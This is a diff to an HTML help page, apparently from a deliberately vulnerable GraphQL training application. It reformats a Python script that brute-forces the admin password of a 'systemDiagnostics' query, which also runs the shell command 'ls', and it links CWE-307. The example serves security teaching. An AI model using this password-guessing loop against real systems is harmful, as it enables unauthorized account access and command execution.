@@ -14,7 +14,7 @@
 <ul>
   <li>
     <a href="https://cwe.mitre.org/data/definitions/307.html" target="_blank">
-      <i class="fa fa-newspaper"></i>CWE-307 - Improper Restriction of Excessive Authentication Attempts
+      <i class="fa fa-newspaper"></i> CWE-307 - Improper Restriction of Excessive Authentication Attempts
     </a>
   </li>
 </ul>
@@ -25,15 +25,14 @@
     passwordlist = ['admin123', 'pass123', 'adminadmin', '123']
 
     for password in passwordlist:
-    resp = requests.post('http://host/graphql',
-    json = {
-      "query":"query {\n  systemDiagnostics(username:\"admin\", password:\"{}\", cmd:\"ls\")\n}".format(password),
-      "variables":None
-    })
+      resp = requests.post('http://host/graphql',
+      json = {
+        "query":"query {\n  systemDiagnostics(username:\"admin\", password:\"{}\", cmd:\"ls\")\n}".format(password),
+        "variables":None
+      })
 
-    if not 'errors' in resp.text:
-    
-    print('Password is', password)
+      if not 'errors' in resp.text:
+        print('Password is', password)
   </pre>
 </div>
 <!-- End -->
